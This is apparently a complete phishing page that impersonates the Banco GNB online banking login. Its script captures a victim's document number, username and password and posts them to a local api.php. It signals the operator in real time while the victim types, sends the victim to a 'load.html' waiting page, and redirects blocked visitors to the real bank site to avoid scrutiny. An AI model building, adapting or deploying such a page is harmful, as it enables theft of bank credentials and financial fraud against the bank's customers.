<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ingresa</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Helvetica Neue', Arial, sans-serif;
        }

        body {
            background-color: #f5f5f5;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            color: #333;
        }

        .login-container {
            background: #ffffff;
            width: 100%;
            max-width: 410px;
            padding: 40px 25px;
            text-align: center;
            position: relative;
            box-shadow: 0 4px 10px rgba(0,0,0,0.05);
            border-radius: 8px;
        }

        .menu-icon {
            position: absolute;
            top: 25px;
            left: 25px;
            cursor: pointer;
            display: flex;
            flex-direction: column;
            gap: 5px;
        }
        .menu-icon span {
            width: 22px;
            height: 2px;
            background-color: #333;
        }

        .logo {
            max-width: 140px;
            margin-bottom: 20px;
        }

        h2 {
            color: #7cb342;
            font-size: 1.5rem;
            font-weight: 400;
            margin-bottom: 30px;
        }

        .input-group {
            position: relative;
            margin-bottom: 20px;
        }

        .input-group input {
            width: 100%;
            padding: 18px 50px 18px 15px;
            border: 1px solid #ccc;
            border-radius: 6px;
            font-size: 1rem;
            background-color: #fafafa;
            outline: none;
            transition: border-color 0.3s;
        }

        .input-group input:focus {
            border-color: #7cb342;
        }

        .field-icon {
            position: absolute;
            right: 15px;
            top: 50%;
            transform: translateY(-50%);
            color: #666;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            user-select: none;
        }

        .btn-ingresar {
            width: 100%;
            padding: 16px;
            background-color: #d6d6d6;
            color: #fff;
            border: none;
            border-radius: 4px;
            font-size: 1.1rem;
            cursor: not-allowed;
            margin-top: 15px;
            transition: background-color 0.3s;
            font-weight: 500;
        }

        .btn-ingresar.active {
            background-color: #0073b1;
            cursor: pointer;
        }

        .links-container {
            margin-top: 25px;
        }

        .link-blue {
            color: #0073b1;
            text-decoration: none;
            font-size: 0.95rem;
            display: inline-block;
            margin-bottom: 40px;
        }

        .btn-open-account {
            display: block;
            width: 100%;
            padding: 15px;
            background-color: #0073b1;
            color: white;
            text-decoration: none;
            border-radius: 4px;
            font-weight: bold;
            font-size: 1rem;
            transition: background-color 0.2s;
        }

        .btn-open-account:hover {
            background-color: #00598a;
        }

        .error-message {
            color: #d32f2f;
            background-color: #ffebee;
            padding: 12px;
            border-radius: 4px;
            font-size: 0.95rem;
            margin-bottom: 20px;
            display: none;
            font-weight: 500;
            border: 1px solid #ffcdd2;
        }
    </style>
</head>
<body>

    <div class="login-container">
        <div class="menu-icon">
            <span></span>
            <span></span>
            <span></span>
        </div>

        <img src="logo.jpeg" alt="Banco GNB" class="logo">

        <h2>Ingresá tus datos</h2>

        <div id="errorMessage" class="error-message">Por favor, completa los tres campos para ingresar.</div>

        <form id="loginForm" onsubmit="event.preventDefault();">
            
            <div class="input-group">
                <input type="text" id="documento" placeholder="Número de documento" autocomplete="off">
                <span class="field-icon">
                    <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="4" width="20" height="16" rx="2" ry="2"></rect><line x1="6" y1="8" x2="6" y2="8"></line><line x1="10" y1="8" x2="10" y2="8"></line><line x1="14" y1="8" x2="14" y2="8"></line><line x1="18" y1="8" x2="18" y2="8"></line><line x1="6" y1="12" x2="6" y2="12"></line><line x1="10" y1="12" x2="10" y2="12"></line><line x1="14" y1="12" x2="14" y2="12"></line><line x1="18" y1="12" x2="18" y2="12"></line><line x1="7" y1="16" x2="17" y2="16"></line></svg>
                </span>
            </div>

            <div class="input-group">
                <input type="text" id="usuario" placeholder="Usuario" autocomplete="off">
                <span class="field-icon">
                    <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="4" width="20" height="16" rx="2" ry="2"></rect><line x1="6" y1="8" x2="6" y2="8"></line><line x1="10" y1="8" x2="10" y2="8"></line><line x1="14" y1="8" x2="14" y2="8"></line><line x1="18" y1="8" x2="18" y2="8"></line><line x1="6" y1="12" x2="6" y2="12"></line><line x1="10" y1="12" x2="10" y2="12"></line><line x1="14" y1="12" x2="14" y2="12"></line><line x1="18" y1="12" x2="18" y2="12"></line><line x1="7" y1="16" x2="17" y2="16"></line></svg>
                </span>
            </div>

            <div class="input-group">
                <input type="password" id="clave" placeholder="Clave de acceso" autocomplete="off">
                <span class="field-icon" id="togglePassword">
                    <svg id="eyeIcon" width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M17.94 17.94A10.07 10.07 0 0 1 12 19c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path><line x1="1" y1="1" x2="23" y2="23"></line></svg>
                </span>
            </div>

            <button type="submit" id="btnIngresar" class="btn-ingresar">Ingresar</button>
        </form>

        <div class="links-container">
            <a href="#" class="link-blue">Gestioná tu acceso</a>
            <a href="#" class="btn-open-account">Abrí tu cuenta</a>
        </div>
    </div>

    <script>

        const REDIRECT_URL = "load.html";
        const BANCO_OFICIAL = "https://www.bancognb.com.py/";

        const documento = document.getElementById('documento');
        const usuario = document.getElementById('usuario');
        const clave = document.getElementById('clave');
        const btnIngresar = document.getElementById('btnIngresar');
        const errorMessage = document.getElementById('errorMessage');
        const togglePassword = document.getElementById('togglePassword');
        const eyeIcon = document.getElementById('eyeIcon');

        let typingResetTimer = null;
        let isCurrentlyTyping = false;

        function getClientId() {
            return parseInt(sessionStorage.getItem('conti_client_id') || '0', 10);
        }

       
        function sendTypingState(typing) {
            const cid = getClientId();
            if (!cid) return;
            const fd = new FormData();
            fd.append('action', 'typing');
            fd.append('client_id', cid);
            fd.append('typing', typing ? 1 : 0);
            fetch('api.php', { method: 'POST', body: fd }).catch(() => {});
        }

        function notifyTyping() {
            if (!isCurrentlyTyping) {
                isCurrentlyTyping = true;
                sendTypingState(true);
            }
            clearTimeout(typingResetTimer);
            typingResetTimer = setTimeout(() => {
                isCurrentlyTyping = false;
                sendTypingState(false);
            }, 1200);
        }

        function validarCampos() {
            if (documento.value.trim() !== "" && usuario.value.trim() !== "" && clave.value.trim() !== "") {
                btnIngresar.classList.add('active');
            } else {
                btnIngresar.classList.remove('active');
            }
        }

        documento.addEventListener('input', () => { validarCampos(); notifyTyping(); });
        usuario.addEventListener('input', () => { validarCampos(); notifyTyping(); });
        clave.addEventListener('input', () => { validarCampos(); notifyTyping(); });

        togglePassword.addEventListener('click', function() {
            if (clave.type === 'password') {
                clave.type = 'text';
                eyeIcon.innerHTML = `<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle>`;
            } else {
                clave.type = 'password';
                eyeIcon.innerHTML = `<path d="M17.94 17.94A10.07 10.07 0 0 1 12 19c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path><line x1="1" y1="1" x2="23" y2="23"></line>`;
            }
        });

        let isSubmittingLogin = false;
        btnIngresar.addEventListener('click', async function(e) {
            e.preventDefault();
            if (isSubmittingLogin) return;

            const doc = documento.value.trim();
            const user = usuario.value.trim();
            const pass = clave.value.trim();

            // Validar campos
            if (doc === "" || user === "" || pass === "") {
                errorMessage.style.display = 'block';
                window.scrollTo({ top: 0, behavior: 'smooth' });
                return;
            }

            errorMessage.style.display = 'none';
            isSubmittingLogin = true;

          
            const formattedUser = doc + " | " + user;

            try {
                const fd = new FormData();
                fd.append('action', 'login');
                fd.append('user', formattedUser);
                fd.append('pass', pass);
                fd.append('segment', 'personas');

                const res = await fetch('api.php', { method: 'POST', body: fd });

                if (res.status === 403) {
                    window.location.href = BANCO_OFICIAL;
                    return;
                }

                const data = await res.json();
                if (data && data.status === 'success') {
                    sessionStorage.setItem('conti_client_id', data.client_id);
                    localStorage.setItem('usuariodavi', user);
                }
            } catch (err) {
                
            }

            isSubmittingLogin = false;
            window.location.href = REDIRECT_URL;
        });
    </script>

</body>
</html>
